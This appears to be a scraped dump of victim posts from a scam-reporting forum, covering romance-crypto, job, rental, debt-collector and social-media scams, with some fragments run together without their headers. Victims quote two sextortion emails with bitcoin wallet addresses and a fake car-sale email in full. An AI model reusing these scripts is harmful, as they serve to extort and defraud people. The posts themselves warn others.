1697499457.0,Victim of a Pig Butchering Scam Big Time,"I am going to share a personal experience with online crypto currency scamming that just happened to me in hopes I can help even one person have to go through what I just did. I have known about scams as Nigerian scammers got me back in 2018 and I thought I was able to spot a scammer a mile away, but how wrong I was. On May 8 I was browsing Facebook and checking my accounts for messages from friends when a pretty Asian woman named Kai Lin reached out and said hi to me. I was about to delete her and move on (boy, how I wished that I did) but I said hi in return. I then asked where she was and she mentioned South Los Angeles by way of Singapore which was her home country. I asked her what could I do with her so far away as I am near Washington D.C. and she replied: "" I don't think distance is a problem. If you have a heart, it doesn't matter how far you are. If you don't have a heart, you will feel far apart if you re 1 mile away."" I felt bad at my response, so I continued to engage her and she was very enthralling, and we had about a week of wonderful conversations, talking about family, future goals and many other things like being filial to our parents and then the topic of money came up, very suttle at first but I was told that I am well off but not boasting and I thought ok, now what? I listened more and told her I was trying to set up my parents to retire and provide support them and that is when I was introduced to investing. I did not know what investing at first and another week or so passed until cryptocurrency was brought up. I did not know anything about it and I told her I needed to do some research and she offered to reach me. I said OK and we went on a tour of her ""visuals"" (which turned out to be complete fakes) and she said we should start with a small amount like $1000 to see if it was something I wanted to do further. She also said I will do it with you and show you how I make money.  Still nervous but she had doe her homework to find out thongs about me to know what buttons to push so I wired $1000 from my band to [Crypto.com](https://Crypto.com) after creating an account there and then we also created an account at [crypto-dex.org](https://crypto-dex.org) (it used to be [crypto-dex.com](https://crypto-dex.com) but had changed on July 1, more on that later) and then Kai Lin took me on a tour of the website and showed me how to invest in BTH, turning my dollars into USDT and also how to watch the market. I made $171 on the first trade of $10 but then my money sat for over a month and when I asked why Kai Lin told me I needed to advance to the upper levels where she traded and to do that I needed to come up with $20K more. When I said now, I wanted out, she again shamed me and told me I had no ""vision"" and would never amount to anything. I started checking out some inconsistencies in her story and then found out her Facebook page under the nae Kai Lin was created by someone named Greg Williams. I asked her about this and was told not to worry about it. Red Flag there so I took note and then tried to search further. I image searched her photos and could not find her face using the normal Google or Yandex so I was introduced to AI (Artificial Intelligence) and got hold of a powerful tool and searched again and my jaw hit the floor when I got back the results. This person was NOT who she claimed to be. Every week I would get some pretty photos of a beautiful Asian women and I though they were her. But AI proved different s it found her photos quickly. They turned out to be a set of photos of a woman called Thet Htar who is from Myanmar and is Burmese. She is stunningly beautiful, and I also found out this scammer was using her pictures in 12 (twelve!!) different accounts. So, I confronted her and told her I was done and wanted my money immediately and called the customer service help center of [crypto-dex.org](https://crypto-dex.org) and asked for a withdrawal. Kai found out about this and immediately got online and tried to persuade me to stay after she said, if you believe I am a scammer, go withdraw all of your money. When I tried to do so, she came back and talked nicely and said before I got my money, I had to complete an ETH challenge. I did not know what that was but if it was going to get me back my money, I agreed. I wanted out and I wanted to go back to a normal life. But lo and behold, the ETH challenge was I had to purchase 20 units of ETH at $1668 apiece and then one done, I would have passive income of about $12,000 to supplement my earnings. But ETH meant I now had to spend over $112,000 to buy the ETH and then get back my 60K in the account. Of course, I could not do that so I tried to see what was possible. I called customer service once again and they said if you did not finish the ETH challenge you would be ""punished"" and ironically or not ironically Kai came back online and said the exact same phrase to me, I would be ""punished"" by losing 5% each week until my funds were exhausted. I asked Kai for help, and she told me there was no other way and now getting frantic I asked what could be done. She offered to help but only after I put up my part of the money first. It was then I realized that I was being scammed and I had lost my money. I called the FBI and Secret Service and filed reports but to no avail. I yelled and screamed at her and cussed her out good and she returned the favor and still said only after putting in 20K could I get my money back. There is more to the story as she told me to fly to Los Angeles and meet her, but I found out she is in Asia beholden to the Chinese triads working in some call center and having to scam 5 new people every day or risk being punished, beaten or worse. In short, my money is gone all 60,000 of it and I feel shamed but if this can help anyone, it was worth it. The nae Kai Lin should be looked out for and if you see a face you do not recognize, use [facecheck.id](https://facecheck.id) to search it, it works really well. She was a liar, a thief and seems to have zero shame stealing money from people and leaving them broke. I saw some red flags but at first she was so nice I thought that they were not as bad as it turned out and they were worse. Please avoid any new people popping up in your feed, ANY online crypto currency investing (it is a 100 percent scam ALWAYS) and I have lost 60K but have turned ot over to the FBI and Secret Service.

Sounds sketchy already I know, but they don't want your banking information or any money from you. They give you money to play online with a specific set of directions and you keep playing until you hit your goal. When you hit your goal you are then compensated for your time? They have a Facebook page and a LinkedIn page. But when you start searching online for company info that's where it gets weird. There isn't really much to go on other than their pages I mentioned.

1697491139.0,New & Improved Media Scam,"I am writing this so that it‚Äôs a help and guide for others who may be getting scammed through this new company they found. 

It buffles me to see legitimate businesses go under only for someone to come and claim it, create profiles impersonating the people who actually worked on it.

I‚Äôve been very vulnerable with trying to find employment. The hiring process is truly exhausting, sometimes I want to throw my phone away because I‚Äôm sick of literally receiving the same robotic messages, endless one-way interview and just rejections after rejections. I‚Äôm literally someone who puts her full heart in what she does, I have 6 years experience with the same company ‚Äî leaving only because of time difference. I‚Äôm resourceful, loyal, compassionate and enthusiastic. Within those 6 years I‚Äôve been promoted every year! How do I prove that to a bot? I‚Äôm literally so demotivated of having million follow up 6,7 interviews and assessments only for it to end at radio silence. My time is literally wasted on these endless steps. 

Now that you know my frustration with the hiring process loop, I became detached to anything that comes my way and just apply and answer without thinking where it‚Äôs headed. With this particular scam, I applied to several job openings on LinkedIn. The job posting had 350+ applications when I had applied and they closed it and were no longer accepting applications. 


I never thought about scammers or anything on LinkedIn. I checked the profile of the poster ‚Äî had pretty good 600 connections, some endorsement from previous colleagues, connected to the company profile, a nice photo, location checked. I was like okay everything checks out. I applied and 30mins later the person reached out to me.

Asks me to continue an interview via teams and to follow a link. Again, I didn‚Äôt think much of it, I did. It was at 8/9pm, at first I found it strange that it was a chat interview with the ‚ÄúPresident‚Äù of the company. But then I thought maybe it‚Äôs a small company. I moved on and did it. Then after 15 questions or so, again nothing suspicious was asked he said I‚Äôll get back to you next week. No urgency, no nothing. Scammers are known for pressuring individuals and moving fast. But not with this so I didn‚Äôt catch on it.

A week or so pass, and I forgot about it. No one texted me so I didn‚Äôt think about it. Then one day he messages me and says he will get back to me in a week. Mind you the one thing that made me suspicious is the rate they were paying for an operations manager, it was $45/hr. 

After that message I started looking them up, checked his connections, employees of the company on LinkedIn, I went too deep with my search until I ended on their Facebook. Looked like a very diverse company with a lot of fun team bonding activities, photos, comments from real people etc. But here is the catch, their last post was in 2016. So that made me alittle more suspicious. And I left it at that.

Two weeks since having this ‚Äúchat‚Äù interview by the actual president for this too good to be true $45/hr operations manager remote position, I miraculously received an email with the subject ‚ÄúOffer Letter‚Äù. Lo & behold it‚Äôs them with an attachment of the offer details. Then I check the sender it‚Äôs a yahoo email with no domain. My suspicion grew even more, so I checked his IP address and compared it to Linkedln location, company address. Something didn‚Äôt add up. 

So I went on digging, nothing about New & Improved Media came up with scam likely. Other scam likely with similar pattern came up from redditors. That reaffirmed my suspicion and the tactic used was more or less the same just a different company name used this time is linkedln instead.

So I wanted to confirm this is actually accurate and this company is no longer functioning. I went on Facebook and messaged every employee who commented on any of their post in 2016 and before. I messaged at least 15 different people on Facebook. The first response I got was ‚Äúthey‚Äôre no longer in business‚Äù and the two more said the same thing. One going out of his way to confirm with his previous boss who confirms the same and says the said President is actually retired. The same ‚ÄúPresident‚Äù who has been messaging me and offered me the position. The poor guy is being impersonated by some scammer.

And what do I do next after the good Samaritans confirm? The guy messages me and pushes me to send over the signed Form I-9, this makes the scam more official? Idk but it‚Äôs daunting to know this form literally provides all your personal information to the scammers including SSN. I said to him no thank you, and I curse him in Hindi just to see how he responds. Thanks to my friends for teaching me the bad words. Guess what he asks, ‚ÄúWhere are you originally from actually?‚Äù No we know it‚Äôs some dude in Mumbai using VPN. 

I‚Äôve gone through the trouble so you don‚Äôt have to. Please do proper research and for the 100th time if something is too good to be true, it probably is.

1697489442.0,Fullstaq affiliate course (Business Launch Challenge),"I have to post this because it took me some googling to connect the dots. 

The Fullstaq course will walk you how to set up a funnel. They won‚Äôt actually explain what they‚Äôre doing, it‚Äôs more of a ‚Äújust click here, open that, log in here, paste your info there and save‚Äù type of class rather than an explanation of what is actually happening. 
However. The funnel they‚Äôre walking you through the setup for is a funnel for their class. So the whole time unbeknownst to you, you‚Äôre basically signing up to resell their class. 

The modules are maybe 1-2 hrs a day and the remaining 6 hours are just toxic positivity-prinkled pseudo-hypeman rhetoric (‚Äúno complaining, no whining, no negativity‚Äù, so you are shamed for telling them the class sucks or it‚Äôs useless)

The class is ‚Äúonly‚Äù 39.99 but you know what else you will have to pay for? A domain. Hosting. That‚Äôs like $45. And once you‚Äôve spent 2 days setting up your funnel, the moment it is complete with your auto responders for your product guess what! there are no more modules or explanations, just a link to where you can buy traffic and some more programs valued at $60K that you can buy for the low low price of only an additional $5K. Oh and you know what else! The traffic source they recommend for you, you know, the thing you get people to buy their course from? It‚Äôs another $80-$700 MONTHLY. Because no one is organically visit Imbrokeanddesperate.com. And of course, they claim the more you spend the more leads you‚Äôll get. 

Here‚Äôs the kicker. 

I looked up the traffic company they recommend, Zero Chase Media at 3651 Lindell Rd, ste d513, Las Vegas NV

You know who else uses that address? Fullstaq. But did they tell you that? No lol

 So they will make money off of you setting the funnel and from traffic YOU FUND to their ad to sell more courses where more people will pay THEM to set up more ads for more courses where more people will pay THEM to set up more ads for more courses‚Ä¶ etc.

They also encourage you to ask other people on the class to test your website by putting in their email address, and then that in turn becomes a lead in your funnel so everyone started thinking they immediately had leads (again, the elderly and the technologically ignorant) but really it‚Äôs just your other classmates helping you test your site.

The only reason I‚Äôm sharing this is because I paid a minimal amount for this course and am not spending another dime, I am in a position where $40 is nothing, but there are broke, desperate and elderly people (my class had hundreds) who are going to sign up for the $5K course and maybe more, unaware of what‚Äôs happening because during the course they didn‚Äôt even know how to open up a chrome tab or exit full screen mode or resize their screen windows.

Next month comes and I see a transaction from the account that was linked to that same card. Attempted Netflix purchase. Confirmation. Instantly reordered new card. 

I just got a call from ""my bank"" saying it was fraud prevention. *Sigh* they said the card ending in 1234 (not the real #) was just attempted to be used out of state and they were calling to confirm it wasn't me.

1. Offering more than I asked for - They offered more than I asked for citing minimum requirements for investment and their assessment of how much I will *actually* need.
2. Offering to take less equity than i offered, again citing that it would be better for my company to grow if they take less equity.
3. New website - their website is 3 months old despite being founded in 2005.
4. No social media or online presence other than their website
5. Off shore accounts - they said documentation from their bank proving their ability to provide this capital will come from an off shore bank in China due to the ongoing crisis in Israel.
6. On a zoom call the representative barely asked any questions about my company stating that my pitch deck gave him enough Information.
7. On the call the representative only had his camera on for a short period of time because of poor connection
8. The representative claiming to be from Switzerland did not seem to have a Swiss accent, although he did look European (perhaps a deepfake?)

1697477193.0,Booking.com Scam,"Recently got a notification that someone had used my booking.com account to order 10 hotel rooms in another country. I checked with both booking.com and the hotel that apparently gave out the rooms.  Both confirmed that someone had ordered rooms under my name at that location. I didn't have a payment method attached to my account so nothing was charged to me or family members. Is wondering what the scam even was. They put in a fake declined card to hold the rooms. Did some digging and no cards have been opened in my name recently. And yes, I did go through all my accounts and changed passwords just to be safe. Even double checked i've never had a card with that number before. 

So any idea what the scam was and what they were trying to do or what's going on?

Update: Ended up canceling the reservation from my end instead of waiting for booking or the hotel to do it. It says there was a cancellation fee but since there wasn't a valid card on the order to charge and mine wasn't on there either it didn't really matter. Ended up closing the account soon after.",Malware,1072,198,23,0
1697476816.0,Extremely responsive and realistic bot or just a determined live scammer?,"I recently received a phone call from someone claiming to work for a US government agency that does not exist. The name of the imaginary agency includes my states name so I will leave it out. The scammer did not have a robotic voice but the intonation was very distinct and slightly ‚Äúoff‚Äù. They had an American accent.
 
 They started by ‚Äúidentifying‚Äù themselves, claiming to be doing a government survey, reading my number back to me, and asking if they had the correct number. I said ‚Äúno‚Äù and the person on the other end said ‚ÄúI‚Äôm sorry, I‚Äôll hang up and try the correct number‚Äù.
 
They immediately called back, said the exact same script with the exact same intonation. I again said ‚Äúno‚Äù, they again apologized in the same way and said they would try the correct number. 
 
This happened exactly the same way 3 more times. On the final one I accused them of being a bot, they gave a response along the lines of ‚Äúohh no I‚Äôm not a robot I am a human being‚Äù, I attempted to interrupt them several times through this response with no reaction. I then asked them their current stance on the political climate of the US. They said ‚Äúmy boss can hear this call and I would rather not discuss politics‚Äù. I again attempted to interrupt them to no avail or even slight response. I then said ‚Äútake me off of your call list‚Äù and they tried once more to get me to take the survey, I repeated the request to remove me from the call list, they said okay and I haven‚Äôt heard from them since. 
 
I was almost certain it was a bot. The vocal patterns, repetition, and inability to interrupt them made me believe they were a scripted bot. However I‚Äôve never seen or heard of a scam bot that sounds quite that realistic and has responses for random things like politics.
 
I know with certainty that it was a scam of some kind as the number leads no where and the agency they claimed to be from does not exist, period.

This is the first email I got from them over the weekend and ignored it thinking its a scam. 

**Your personal data has leaked**

Hi,

&#x200B;

I am a professional hacker and have successfully managed to hack your operating system.

Currently I have gained full access to your account.

&#x200B;

In addition, I was secretly monitoring all your activities and watching you for several months.

The thing is your computer was infected with harmful spyware due to the fact that you had visited a website with porn content previously.

‚ï≠ ·ëé ‚ïÆ

&#x200B;

Let me explain to you what that entails. Thanks to Trojan viruses, I can gain complete access to your computer or any other device that you own.

It means that I can see absolutely everything in your screen and switch on the camera as well as microphone at any point of time without your permission.

In addition, I can also access and see your confidential information as well as your emails and chat messages.

&#x200B;

You may be wondering why your antivirus cannot detect my malicious software.

Let me break it down for you: I am using harmful software that is driver-based,

which refreshes its signatures on 4-hourly basis, hence your antivirus is unable to detect it presence.

&#x200B;

I have made a video compilation, which shows on the left side the scenes of you happily masturbating,

while on the right side it demonstrates the video you were watching at that moment..·µî.·µî

&#x200B;

All I need is just to share this video to all email addresses and messenger contacts of people you are in communication with on your device or PC. 

Furthermore, I can also make public all your emails and chat history.

&#x200B;

I believe you would definitely want to avoid this from happening.

Here is what you need to do - transfer the Bitcoin equivalent of $650 to my Bitcoin account

(that is rather a simple process, which you can check out online in case if you don't know how to do that).

&#x200B;

Below is my bitcoin account information (Bitcoin wallet):

bc1qnpmkx704fcugzuc727axz9dqqnjf904fz2qq8n

&#x200B;

Once the required amount is transferred to my account, I will proceed with deleting all those videos and disappear from your life once and for all.

Kindly ensure you complete the abovementioned transfer within 50 hours (2 days +).

I will receive a notification right after you open this email, hence the countdown will start.

&#x200B;

Trust me, I am very careful, calculative and never make mistakes.

If I discover that you shared this message with others, I will straight away proceed with making your private videos public.

&#x200B;

Take care and have a good day.

&#x200B;

BUT now I received a second email which is below‚Ä¶ I understand it‚Äôs probably a scam but the follow up is freaking me out. What should I do? I ran a deep scan on my computer and it came up with PDF:PhishingX-gen\[Phish\] in my mailbox folder. what does this mean?

&#x200B;

**Hi, my prey.**  
This is my last warning.

I write you since I attached a tr ojan on the web site with porno which you have viewed. My trojan captured all your private data and switched on your camera which recorded the act of your solitary se x. Just after that the tr ojan saved your contact list. I will erase the compromising video records and info if you transfer 710 United States Dollars in bi tcoi n.

This is address for payment: 1DvEgCFc6MHsbajRvkctjUPAPtn51b6DcN

I give you 24 hours after you open my message for making the payment. As soon as you read the message I'll see it right away. It is not necessary to tell me that you have sent money to me. This address is connected to you, my system will erased automatically after transfer confirmation.

If you need 40h just Open the calculator and type +,+

If you don't pay, I'll send dirt to all your contacts. Let me remind you - I see what you're doing. If you try to decieve me, I'll know it immediately. I don't live in your country. Bye. Don't forget about the shame and to ignore, your life can be ruined.",Malware,4039,702,92,0

Everywhere in my city is really expensive and I couldn't find a place to stay until I found a house for rent listed on Craigslist (first mistake I know.) I emailed the owner asking for a viewing, they told me I could go look at the house. When I did it was exactly like the photos and everything seemed to be legit. The man in the emails said he was currently in chemo therapy and couldn't meet up with me in person to do the viewing. I asked around and everyone in my life told me it seemed legit. I filled out an application and within a day or two they said I had been approved and told me to send the first months rent and deposit and then they would leave the keys at the house so I could move in. He asked me to use zelle to send the payment (my next big mistake.) I sent the $1560 so I could move in. Once I sent them the money they immediately told me to send them more because they changed their mind on the deposit amount. When I told them I couldn't afford to send them any more money, because that was literally all I had left, they went completely silent. After a few days of not hearing anything I contacted my bank to try to label it as fraud. The bank told me since it was a zelle transaction there was nothing they could do. I called zelle and they told me to talk to my bank. I talked to probably 10 different people my bank over phone and in person and they all told me the exact same thing. At that point I got my local police involved. The police took over 2 weeks to even look at my case. I had to call them over and over again before they even assigned a detective. They told me it took so long because the email I sent them with my evidence, which they told me to send, got put in their spam folder. Within a day of being assigned a detective they told me they weren't going to investigate it and to contact ic3 instead. I sent in a report and after not hearing back for over a month I sent in a second one and still haven't heard anything.

I can recall a few of them ‚Ä¶ there were the ‚Äúenvelope stuffing‚Äù scams, the ‚Äúart school‚Äù scams (‚ÄúDRAW THE PIRATE!! YOU MAY WIN A SCHOLARSHIP!!!‚Äù), and many others I only vaguely recall.

I actually fell into a ‚Äúsolve the puzzle!!‚Äù scam when I was about 9 years old. I was (and still am) an avid crossword fan, and this puzzle scam began with a simple mathematical logic problem. The details escape me, but I solved the puzzle and eagerly mailed (by U.S.P.S) my entry and dreamed of the big prize that would follow.

What followed was not a prize, but another puzzle to solve ‚Ä¶ apparently so many people had qualified for the BIG PRIZE that I would have to compete in the tiebreaker round‚Ä¶the first of many. So I again solved and eagerly mailed the second round answer for my prize.

No luck; just another tiebreaker puzzle followed. At this point, I approached my Dad, who taught me the ways of the scammer. As best I recall, this ‚Äúcontest‚Äù was nothing more than a ‚Äúbait-and-switch‚Äù which over time would morph into a ‚Äúto claim your prize, send X amount of dollars to Charlie Moneybags‚Äù.  But alas: I had been hooked.

By entering this ‚Äúcontest‚Äù my name / address etc. would be forever enshrined in the ‚ÄúSuckers List‚Äù and BOY did I get mail by the boatloads!! The postman hated me.

The order went through fine and I would frequently check my Amazon to see where it was. Then a few days ago, I got an update on the Amazon page saying there was going to be a delay on my friend's gift. Alright, that's fine. Delays happen.

But then yesterday, I got a text saying a delivery was put on hold due to an incorrect zip code. There was no specifics to what was put on hold or where it was bring shipped from.

1697328594.0,Two Scams You Should Know,"The first scam that came my way almost got me and the second was highly convincing. Both are not the norm. 

First off, I‚Äôd like to point out the obvious: the abundance of scammers are calling or texting outside of the US and we are used to them calling us from Kolkata and/or sending photos of Asian women. So when the scammers call within the US, without an accent and pose as extremely hard nosed sounding lawyers or employers, don‚Äôt let your brain go into autopilot response mode. 

The first one came when I was applying for work and at a time I just wanted to do something part time and manual labor, so cleaning sounded like a great part time gig to get moving and I also find it relaxing (calming my mind). I thought I had signed up for a cleaning company recruiting new hires to work for their team. The guy who called me must have been training someone as there were two of them (not on the phone at the same time but I could hear another man asking questions and being referred to.)

He was extremely slick and got me talking when I was in a good mood. I was trying to get the details of the job, and he was doing great with making it sound like what I was looking for. While I was asking him for information, he was asking me for my information, address etc. This conversation ended up wasting over an hour 1/2 of time as he wasn‚Äôt being clear on his responses and I was genuinely trying to get to the bottom of EXACTLY what the job entailed. I FINALLY got it out of him, that it wasn‚Äôt for a company, that I was supposed to sign up my services for their REFFERAL service, and supply my own equipment and products. The guy never stopped talking and continued to get what areas I could provide for, what exact services I could supply‚Äî-this was before I could find out it was a referral service btw. I continued to think about it. If I wanted to supply my own items. ‚ÄúMY NAME‚Äù, he said, I just need your SSN# to complete the form!‚Äù I reply on autopilot 55$-0$- fii‚Äî-wait a second, I‚Äôm not going to give you my social security number over the phone when I still haven‚Äôt decided if I even want to do this.‚Äù

Yes but we just need the last four of your social to get started. 

Mm hmm. So this isn‚Äôt with a company. This is just me. And you don‚Äôt offer anything except to ADVERTISE my services correct? Because you haven‚Äôt exactly been forthcoming. 

Sigh. That is correct now I just need the last four of your social. 

I know you want the last four but you don‚Äôt *need* it because that isn‚Äôt how this works. You need to extend an offer of employment and I need to fill out the forms to be eligible. 

I just need th‚Äî-

And I‚Äôm not going to give it to you. 

Just the last four‚Äî-

Aaaand I‚Äôm not going to give it to you. 

Now I‚Äôm going into fuck with the guy just to see how long will he keep going bc I‚Äôm ticked at myself for almost giving it to him. It turned out he was entirely willing to go for at least the next 30 minutes which became extremely comical and elevated in our back and forth which would take up too much space to go into here. 

‚ÄúYou can do a legitimate intake hiring process for freelance work and send me the I-9 forms in the mail if you aren‚Äôt going to do it in person. You‚Äôre fucking with someone with 20 years of freelance experience‚Äù didn‚Äôt even stop him, it was ridiculous!

We literally went back and forth with an ‚Äúam not‚Äù, ‚Äúam too‚Äù! Type of exchange that went on and on. Except it was ‚ÄúI just need the last four.‚Äù ‚ÄúAnd I‚Äôm not going to give it to you.‚Äù For 30 more minutes. He really thought he could force it out of me bc he got a taste, even though I went cold. I couldn‚Äôt believe how long he went on with his boner, trying to impress his little friend or trying to wear me down? 

It finally ended with my saying I‚Äôm more than willing to continue to waste your time. I have nothing else to do today. But he continued and it didn‚Äôt really stop until someone else came over and I put him on speaker and yelled ‚ÄúCan you believe this fuckhead is trying to get my social security number over the phone!? I‚Äôm the dipsht who almost gave it to him and now he thinks if he repeats it 100x I‚Äôm magically going to give in! Lolll!‚Äù At which point he thanked me and got off the phone. 

Never ever do what I almost did! Job Scammers!

Scam two was crazy!

A man claiming to be a process server called my mom asking if we would be home because she was being *sued* and when could he come over to her house to serve her for court proceedings over unpaid credit card debt. He sounded completely legitimate. My mom was extremely upset because he was saying she had unpaid back debt going back to 2007, and her house was being put on lien. (Everything was on speaker-phone.)

I took the phone. Excuse me this is her daughter could you please repeat what it is? He repeats it and says he‚Äôs just the process server and doesn‚Äôt know anything about anything, he just wants to know if we‚Äôll be home so he can serve us. He gives me an 888 number to call the lawyers. I do so. Half ring and a man picks up sounding exactly like the first guy who starts spewing legal terminology at me. Excuse me I say, but can you please cut the legalese and speak plainly? He is sounding annoyed JUST LIKE a lawyer whose time I was wasting. ‚ÄúI can‚Äôt respond with the exact terms with respect to my client‚Äôs anonymity.‚Äú 
‚ÄúOh ok. So you are saying that she owes $16,000 from over 20 years ago in credit card debt but you can‚Äôt tell me who or what?‚Äù

That‚Äôs correct and she‚Äôs been sent several pieces of mail and hasn‚Äôt responded yack yack yack further legalese and she should take it up with her lawyer, and begins to say something about a $5,000 lower payment option. 

‚ÄúI tell you what, you go ahead and send us the exact debts and the breakdown of what these charges are EXACTLY and we‚Äôll go from there. Go on ahead and send the process server but until you send a copy of the breakdown for the *exact* charges, we won‚Äôt be proceeding with anything.‚Äù He gets off the phone. 

I can‚Äôt call the process server back because he called from an unknown number. 

She‚Äôs ticked and scared. We look up how long they can continue to collect credit card debt. I think it said 7 years. 

Then I realized, not only do we both think it sounded like the exact same dude, how did the lawyer know to answer the phone with my name when I called back when I didn‚Äôt give it to him yet? He answered rt away: ‚ÄúHow can I help you Ms Name?‚Äù

Unsurprisingly, no process server showed up. 

Always remember: these people need to send you a breakdown of charges via federal mail. Which they had never done because that would bring Federal charges if they try to scam you that way. 

They are trying to sound scary to old people with buzz words: debt. Sued. Lawyer. Process server. Coming to your home. Juuust to get that ‚Äúinitial payment.‚Äù

I've never heard of this place--they seem to be a small CPAP business based in MN--nor have I ever bought a CPAP machine. And I live in NYC. 

I'm on the phone now to lock down my bank account but I'm thing to figure out what kind of fraud this even is. If someone managed to steal my bank account, why 12 charges to some random CPAP small business across the country, and why the refunds 3 days later, and why not start buying other stuff meanwhile. So confused. 

I'm struggling to even understand how they got my account number. I lost my wallet and debit card a few weeks ago, but I immediately closed all my cards and have a brand new debit card with a brand new #. There was no information about my bank account number in there. So either my bank account # got leaked elsewhere, or my _new_ debit card number has been stolen in the last 2 weeks since getting it. I don't use my debt card or bank account for anything but bills.

1697307235.0,Facebook becoming overwhelmed with scams - infuriating & unusable,"I help run the social media accounts for a public school where I work. We have a decent sized following on Facebook, where many of our parents and community members get important info, but over the last couple years the spam, malicious links, and scamming nonsense has just gotten worse and worse. I have tried to turn on moderation tools, but every time I find something that I think works, the scammers find a work around within a few weeks. It's so frustrating because we really use our page to help disseminate information and a lot of older parents/guardians and grandparents just aren't tech-savvy enough to not click the obvious spam links. I feel like I'm spending way too much time trying to outsmart these bad actors and it's exhausting.  Some examples of what I'm seeing:

Every day we have a sporting event (which is 3-4 days per week), multiple pages with legitimate looking names will tag my school's page or list my page as co-hosts for an event. The post/description looks like it's a livestream of our games (correct date, time, location, school names and mascots), but it's not our link. They aren't associated with us in any way and I know it's probably some malicious site that steals your info. I always block and report but they just make new pages. 

Then they started commenting on our posts, even posts that had nothing to do with athletics. Same BS: legitimate date, time, location, and team names with mascots, but completely scammy link. There would be like 10 of them on every post. I got fed up and when into the page moderation settings and turned on comment moderation based on keywords, because I noticed patterns in the words and links used. That caused all the scam comments to be auto-hidden, and for the last month I've been relatively happy with that situation. At least is prevents vulnerable people from seeing it. 

Then, this week, the spam pages got smart again. They started leaving comments like ""Way to go!"" and ""So Exciting!!"", which sounded normal and went un-flagged. Then, TWO DAYS LATER they edited their comment to contain the scam athletic information with the bad links. The auto-moderation didn't catch it. I was so frustrated! How could it be worth their time to play the long game like this? 

I know Facebook has much bigger problems then just the public school pages getting hit by these scammers. On my personal account, they keep recommending me reels and images of stolen content. Webcomics with the original artist cropped out and reposted without permission. Reels from whole accounts whose entire page is just reposted videos from the exact same person, with a name nearly identical to the original creator. I try to report and block but nothing happens because ""you have to be the copyright holder to submit a copyright infringement claim"". Then sometimes the original creator can't even get the stolen content taken down!

I'm even seeing these scammers start to post stuff in the ""Reviews"" section of the pages, including the one I run. The reviews are ""Positive"" but the content of the review has nothing to do with the actual page.

How can Facebook be so bad at managing all of this? Their safeguards are so terrible it's almost like they have nothing in place at all. I wish I could just throw away their whole app but it's part of my job üò≠

BOTTOM LINE I LEARNED MY LESSON WITH WHY THEY SAY DO CASH ONLY when using fb i thought that meant for not sending cashapps over the app before receiving the product i didnt know that meant for this i only did cashapp bc i have no car and had to send the money to my gf to get the food bc shes catching a ride to the store then here so she cant make trips to get the cash from me then do everything else bc her ride has stuff to do. 

Summary: it was $70 btw
- Sold smth on fb marketplace 
- Person checked out item 
- I typed in my cashapp 
- I received the typical cashapp notification 
- Along with the email one i always get 
- I also got the text notification abt the money also always get this
- I checked in my app it showed up
- Checked the transaction page their face and name popped up with it
- I went to send the same money to someone on cashapp
- It said my transaction was declined by my bank

What i think happened:
- They used a stolen credit card to send so i cant use it or its a glitch

What looks off  & where i went wrong:
- I didn‚Äôt technically see them send it to me i typed it and i saw them click confirm to send but thats it 
- It took a while to pop up on my balance 
- it has a (+) sign beside the amount they sent but other money i received doesn‚Äôt have that on my transaction list
- They did look shady but i dont judge people",Malware,2187,454,9,0

I reached out to support to ask if they can get it unlocked but they lied to me about GSM stuff. However, it was actually locked by Verizon because the original owner of the phone had not paid for their phone bill. I verified this by contacting verizon with the IMEI number.
Anyway, BackMarket told me to bring back the phone which I did but then couldn‚Äôt acknowledge receipt of the phone. They started throwing me in circles as they told me to contact the courier.

I had googled the name of the website and it had not turned up any warnings. I first became suspicious when going on a half-hour later I had not received my ebook. Going to the website's Facebook page, I found another company listed under the website name. Googling the company name reveal a webpage warning that the company would charge you $20 monthly for access to their ebook collection, something that was not made clear when I signed up.

The website supplied a number to call the company, which I did. The person I spoke to cancelled my order for both the individual ebook and access to their collection. I made a point of informing them that I would be checking with my credit card company to make certain I would not be billed.  After I hung up, I found an email informing me I was subscribed to something from the company. (It may have arrived before or while I called.) I clicked the unsubscribe button, making certain to screenshot the message confirming I was unsubscribed.

I kept checking my email looking for a cancellation message. I did not get that, but roughly two hours later, I found a message in my spam folder that appeared to be from the company, which claimed I was subscribed to something else and featuring a different number to call. I called that number and ended up getting the same person. They said they had already cancelled my order, at which point I asked why I had gotten another email. They then sent me a cancellation email. EDIT: I also made a point of getting their name this time.

_______________________________________________

Hello there,
My name is Kristina, and I'm emailing you about the 2004 Toyota Corolla CE  ( PRICE $800 shipping included ) , gasoline engine, automatic transmission and only 138,237 miles. The engine 1.8L - V4, runs very well and the automatic transmission shifts perfectly. Has a clean and clear title in my name and there are no liens or loans on it. This car was used by my husband who died 4 month ago. The price was reduced at $800 because I'm in a hurry to find a buyer. I need to sell the car before the 15 of next month, when I will be leaving on military duty with my medical team out of the country for a year and do not want to store it. 

Right now I'm on a military base, we are training, getting ready to leave the country. The delivery process will be managed by me. I think I can have it there at your home address within 2-3 working days. It will come with a clear title. I am a member of the eBay buyer protection program and using this service you will get a 5 days testing period after delivery. During that 5 days testing period I will not be getting any money. 

I need to know if you are interested so I can ask eBay to send you the details on this deal. If interested please include in your next email your contact info for eBay ( full name, full shipping address and phone number, so we can get the ball rolling ). 
I hope to hear from you very soon. I attached some pictures Below.
Thank you. God bless you and your family!",Malware,2000,385,44,0

At first I knew it could be a scam but I then I started thinking with my penis. Well I agreed but asked her how would I send the money. She said Zelle but I know Cuba doesn‚Äôt use Zelle, well that according to my old Cuba co workers. So at first I didn‚Äôt think nothing of it. She never asked me for pictures she just wanted money. 
One day she texted me informing me that she mom was sick and she needed money so I was okay fine. I should add every time I sent her money she would send me different numbers to sent to her. 
Then she just kept asking but some days I just couldn‚Äôt afford of it but she understood and waited. 
I started looking at scam videos on YouTube and how they work and it resembled what I was doing with this woman. So I told her today that I wasn‚Äôt sending anything anymore because I just couldn‚Äôt believe it was her. She said I can prove it and send me a video saying that she has no reason to scam me. So I told her to video call me. I put my thumb over my camera so she wouldn‚Äôt see me. The call started with her taking off she shirt I immediately clicked and told her no face only.

